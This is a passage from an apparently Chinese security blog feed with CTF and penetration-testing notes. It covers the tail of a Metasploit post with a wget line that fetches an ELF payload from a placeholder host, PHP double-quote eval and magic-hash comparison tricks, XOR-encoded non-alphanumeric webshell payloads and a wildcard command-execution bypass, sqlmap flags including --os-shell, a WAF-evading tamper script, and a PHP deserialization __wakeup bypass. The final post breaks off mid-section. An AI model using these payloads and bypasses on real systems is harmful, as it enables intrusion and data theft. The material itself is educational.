<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实际上我们可以远程下载zzz.elf</span><br><span class="line"></span><br><span class="line">wget  http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xx&#x2F;zzz.elf</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>php漏洞</title>
    <url>/2021/01/28/php%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<ul>
<li>持续更新</li>
</ul>
<h2 id="0x01-php双引号解析漏洞"><a href="#0x01-php双引号解析漏洞" class="headerlink" title="0x01 php双引号解析漏洞"></a>0x01 php双引号解析漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ft</span></span><br><span class="line"><span class="comment"> * user: shmily-ing</span></span><br><span class="line"><span class="comment"> * Data: 2021/1/28 15:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$a=<span class="number">2</span>;</span><br><span class="line">$b=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span><span class="subst">$b</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a$b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果:</span></span><br><span class="line"><span class="comment">21</span></span><br><span class="line"><span class="comment">$a$b</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>输出结果不同，双引号和单引号都表示字符串，但双引号会对引号内容进行二次解释，就可能出现安全问题。</p>
<a id="more"></a>

<p>所以双引号内出现<code>$&#123;&#125;</code>, <code>&#123;&#125;</code>内的内容就会被当作php代码执行</p>
<p><code>$&#123;php命令&#125;</code>例如： “${@eval($_POST[‘a’])}”</p>
<p>但适用于php5.5以上的版本</p>
<h2 id="0x02-php类型"><a href="#0x02-php类型" class="headerlink" title="0x02  php类型"></a>0x02  php类型</h2><p>####类型转换</p>
<p>php把以<code>字母</code>开头的<code>字符或字符串</code>转化为<code>整型</code>时候，会变成<code>0</code>:<code>&#39;a123456&#39;==0</code></p>
<p>php把以<code>数字</code>开头的<code>字符串</code>转化为<code>整型</code>时候，只取到第一个字母之前的数字:<code>&#39;123456a111&#39;==123456</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;0);</span><br><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;&quot;0&quot;);</span><br><span class="line">var_dump(&#39;123456a111&#39;&#x3D;&#x3D;123456);</span><br><span class="line">var_dump(&#39;a123456&#39;&#x3D;&#x3D;0);</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20210721005633561.png" alt="image-20210721005633561"></p>
<h4 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h4><p>PHP在处理哈希字符串时，”OE”开头的都认为<code>0</code></p>
<p>以下值在md5加密后以0E开头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- QNKCDZO</span><br><span class="line">- 240610708</span><br><span class="line">- s878926199a</span><br><span class="line">- s155964671a</span><br><span class="line">- s214587387a</span><br><span class="line">- s214587387a</span><br></pre></td></tr></table></figure>



<p>以下值在sha1加密后以0E开头：</p>
<ul>
<li>sha1(‘aaroZmOk’)</li>
<li>sha1(‘aaK1STfY’)</li>
<li>sha1(‘aaO8zKZF’)</li>
<li>sha1(‘aa3OFF9m’)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd=$_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($name)==md5($passwd)&amp;&amp;$name!=$passwd)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name=QNKCDZO&amp;passwd=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>

<h4 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd=$_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($name)===md5($passwd)&amp;&amp;$name!==$passwd)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name[]=<span class="number">1</span>&amp;passwd[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>md5([1])===md5([2])==NULL</code></li>
</ol>
<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><p>命令执行函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()、shell_exec()、 passthru()、exec()、popen()、proc_open()、putenv()</span><br></pre></td></tr></table></figure>

<p>代码执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call_user_func()、 call_user_func_array()、create_function()、 array_map()</span><br></pre></td></tr></table></figure>



<h4 id="绕过数字和字母"><a href="#绕过数字和字母" class="headerlink" title="绕过数字和字母"></a>绕过数字和字母</h4><p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423173117812.png" alt="image-20220423173117812"></p>
<p>post 请求构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @$_++;</span><br><span class="line">    <span class="keyword">print</span>($_);</span><br><span class="line">	$__=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>($__);</span><br><span class="line">	$__.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>($__);        <span class="comment"># p</span></span><br><span class="line">    $__.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>($__);</span><br><span class="line">    $__.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>($__);</span><br><span class="line">    $__.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>($__);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _POST</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172539634.png" alt="image-20220423172539634"></p>
<p>get</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$_=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _GET</span><br></pre></td></tr></table></figure>



<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172618113.png" alt="image-20220423172618113"></p>
<p>即：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(<span class="string">&quot;#./|&#123;&quot;</span>^<span class="string">&quot;|~`//&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line">	var_dump(<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>);   <span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172820891.png" alt="image-20220423172820891"></p>
<p>执行命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=$_=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br><span class="line">?code=$_=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=print_r(`scandir`(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  -》 $_GET[_]($_GET[__]);  _当作变量传进去执行getFlag()</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">思路一：绕过字符和数字</span><br><span class="line">code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">思路二：绕过字符和数字+下划线（变量_和__）</span><br><span class="line">code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.成功 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;_&#x3D;assert&amp;__&#x3D;print_r(&#96;scandir&#96;(&#39;&#x2F;&#39;))</span><br><span class="line"></span><br><span class="line">思路三：绕过字符和数字+下划线（变量_和__）+美元符号（$）</span><br><span class="line">1.均失败</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">【最终答案】</span><br><span class="line">思路四：采用通配符绕过美元符号（$）</span><br><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? &#x2F;????&#96;?&gt;</span><br><span class="line">?code&#x3D;?%3E%3C?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;?%3E</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code) + 长度限制</span><br><span class="line"></span><br><span class="line">数字+字母：通过异或构造GET或POST请求实现绕过</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线：构造payload并通过 $&#123;&#125;[’+’] () 替换下划线</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线+美元符：通过通配符（?）实现替换</span><br></pre></td></tr></table></figure>





<p>参考：</p>
<p>津门杯CTF<a href="https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ">https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
<h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
<hr>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2021/02/04/sqlmap/</url>
    <content><![CDATA[<h2 id="sqlmap的常见使用方式"><a href="#sqlmap的常见使用方式" class="headerlink" title="sqlmap的常见使用方式"></a>sqlmap的常见使用方式</h2><blockquote>
<p>需要python环境</p>
</blockquote>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>常见指令:</p>
<ul>
<li><p><code>-u</code>               指定url</p>
</li>
<li><p><code>--dbs</code>          获得数据库</p>
</li>
<li><p><code>--tables</code>      获得表</p>
</li>
<li><p><code>--columns</code>  获得字段</p>
</li>
<li><p><code>--dump   </code>    枚举所有数据</p>
</li>
<li><p>-D 库名   -T 表名  - C 字段</p>
<a id="more"></a>
</li>
<li><p><code>--forms  </code>        让sqlmap自己寻找页面表单</p>
<p>为了防止被ban，还需下面操作</p>
</li>
<li><p><code>--count   </code>     查询数据量</p>
</li>
<li><p><code>--random-agent</code> 构造随机user-agent</p>
</li>
<li><p><code>--delay=2</code>     延迟2秒</p>
</li>
<li><p><code>--level 1-5</code>（默认为1，低等级，如果跑不出来可以加高等级）</p>
</li>
<li><p><code>--tamper  xxxxx.py</code>  调用tamper脚本</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https:xxxx.com?id&#x3D;1&quot; --dbs --count</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>--is-dba</code>          查看权限是否为root，如果显示DBA为TRUE   可以尝试直接webshell</p>
</li>
<li><p><code>--os-shell</code>   尝试拿shell</p>
</li>
<li><p><code>--batch</code>  不询问输入，全部默认确定</p>
</li>
<li><p><code>-v </code>              显示详细的输出等级（-v 3 会显示Payload）</p>
</li>
</ul>
<h3 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy http:&#x2F;&#x2F;192.168.1.1:xxxx</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy-file：加载代理ip列表</span><br><span class="line"></span><br><span class="line">–proxy-file&#x3D;xxx.txt</span><br></pre></td></tr></table></figure>





<h3 id="fresh-queries"><a href="#fresh-queries" class="headerlink" title="--fresh-queries"></a><code>--fresh-queries</code></h3><p>​    不会从缓存里面加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;xxxxx&quot; --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:10809 --is-dba --level 5</span><br></pre></td></tr></table></figure>



<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>使用：<code>--tamper=xxxx.py</code></p>
<p>环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function sqlwaf( $str ) &#123;</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;and&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;or&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;union&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;select&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;sleep&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;group&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;extractvalue&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;updatexml&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;PROCEDURE&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	return $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tamper脚本编写：xxxx.py   （关键词替换）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL              <span class="comment">#__priority__指定了tamper脚本的优先级</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        result = payload.replace(<span class="string">&quot;OR&quot;</span>, <span class="string">&quot;oorr&quot;</span>).replace(<span class="string">&quot;AND&quot;</span>, <span class="string">&quot;aandnd&quot;</span>).replace(<span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;ununionion&quot;</span>).replace(<span class="string">&quot;SELECT&quot;</span>, <span class="string">&quot;seleselectct&quot;</span>).replace(<span class="string">&quot;PROCEDURE&quot;</span>, <span class="string">&quot;PROCEPROCEDUREURE&quot;</span>).replace(<span class="string">&quot;SLEEP&quot;</span>, <span class="string">&quot;slesleepep&quot;</span>).replace(<span class="string">&quot;GROUP&quot;</span>, <span class="string">&quot;grogroupup&quot;</span>).replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>, <span class="string">&quot;extractvextractvaluealue&quot;</span>).replace(<span class="string">&quot;UPDATEXML&quot;</span>, <span class="string">&quot;updatupdatexmlexml&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>



<p>固定格式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> xxx             <span class="comment">#根据需求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">	<span class="keyword">if</span> payload:</span><br><span class="line">		xxxxx</span><br><span class="line">		xxxxx</span><br><span class="line">		xxxxx</span><br><span class="line">		result=xxxxx</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<ul>
<li>ctf中的php反序列化</li>
</ul>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li><p>序列化 即使用<code>serialize();</code>将类的对象的数据用字符串方式进行表示</p>
</li>
<li><p>反序列化 即使用<code>unserialize();</code>来读取 序列化格式的数据</p>
</li>
</ul>
<p>使用序列化和反序列化 主要是方便数据的存储和数据的转换读取。</p>
<a id="more"></a>

<h3 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/4/29 16:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $height;</span><br><span class="line">    <span class="keyword">public</span> $weight;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$height,$weight</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;height = $height;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;weight = $weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$jyf = <span class="keyword">new</span> body(<span class="string">&#x27;180&#x27;</span>,<span class="number">130</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($jyf).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="string">&quot;O:4:\&quot;body\&quot;:2:&#123;s:6:\&quot;height\&quot;;s:3:\&quot;180\&quot;;s:6:\&quot;weight\&quot;;i:130;&#125;&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;body&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;height&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;180&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;weight&quot;</span>;i:<span class="number">130</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span>(body)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;height&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;180&quot;</span></span><br><span class="line">  [<span class="string">&quot;weight&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">130</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>序列化结构：</p>
<p>类型:类长度:”类名”:类的属性数量:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …}</p>
<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>unserialize()的参数可控，通过利用一些魔术方法，构造反序列化字符，进行文件写入，命令执行等操作。</p>
<h3 id="变量三种修饰"><a href="#变量三种修饰" class="headerlink" title="变量三种修饰"></a>变量三种修饰</h3><p><strong>public修饰变量</strong></p>
<p>反序列化内容不需要修改</p>
<p><strong>protected修饰变量</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected $height;</span><br><span class="line">protected $weight;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:9:&quot; * height&quot;;s:3:&quot;180&quot;;s:9:&quot; * weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure>

<p>%00代替空格，占一个字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:9:&quot;%00*%00height&quot;;s:3:&quot;180&quot;;s:9:&quot;%00*%00weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>private修饰变量</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private $height;</span><br><span class="line">private $weight;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:12:&quot; body height&quot;;s:3:&quot;180&quot;;s:12:&quot; body weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure>

<p>同理%00代替空格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:12:&quot;%00body%00height&quot;;s:3:&quot;180&quot;;s:12:&quot;%00body%00weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="小绕过"><a href="#小绕过" class="headerlink" title="小绕过"></a>小绕过</h3><ul>
<li>绕过<strong>__wakeup()</strong></li>
</ul>
<p>对象属性个数的值大于真实的属性 (PHP5&lt;5.6.25 或 PHP7&lt;7.0.10)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;body&quot;:2:&#123;s:6      -&gt;     O:4:&quot;body&quot;:3:&#123;s:6 </span><br></pre></td></tr></table></figure>

<ul>
<li><strong>绕过preg_match()</strong></li>
</ul>
<p>使用+绕过正则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:+4:&quot;body&quot;:2:&#123;s:6:&quot;height&quot;;s:3:&quot;180&quot;;s:6:&quot;weight&quot;;i:130;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><code>__construct()</code> #当对象创建时自动被调用</p>
<p><code>__destruct()</code> #当脚本运行结束时自动被调用</p>
<p><code>__sleep()</code> #当对象序列化的时候自动被调用</p>
<p><code>__wakeup() </code>#当反序列化为对象时自动被调用</p>
<p><code>__toString() </code>#当直接输出对象引用时自动被调用  （echo 等输出）</p>
<p><code>__call() </code>#当要调用的方法不存在或权限不足时自动被调用</p>
<p><code>__invoke() </code>#当把一个类当作函数使用时自动被调用</p>
<h3 id="入门题目"><a href="#入门题目" class="headerlink" title="入门题目"></a>入门题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>( <span class="string">&#x27;flag.php&#x27;</span> );</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/4/29 16:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $fla=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($code)) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($fla =<span class="string">&#x27;hahaha&#x27;</span>)&#123;</span><br><span class="line">	    <span class="keyword">echo</span> $flag;</span><br><span class="line">	    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造$fla =’hahaha’</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 2:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $fla=<span class="string">&#x27;hahaha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>绕过<code>__wakeup()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>最终</p>
